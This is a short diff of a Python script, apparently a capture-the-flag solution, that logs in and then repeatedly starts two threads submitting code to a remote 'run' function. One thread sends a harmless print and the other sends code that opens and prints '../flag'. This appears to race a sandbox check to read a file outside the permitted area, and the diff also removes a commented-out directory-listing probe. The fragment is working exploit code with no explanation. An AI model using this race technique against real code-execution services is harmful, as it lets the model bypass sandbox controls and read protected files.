@@ -35,7 +35,6 @@ login(u, p)
 while(True):
 	t1 = threading.Thread(target=run, args=("print('grazie')", ))
 	t2 = threading.Thread(target=run, args=("import os\nf = open('../flag', 'r')\nprint(f.read())", ))
-	#t2 = threading.Thread(target=run, args=("import os\nprint(os.listdir(os.path.dirname(os.getcwd())))", ))
 	t1.start()
 	t2.start()
 	t1.join()
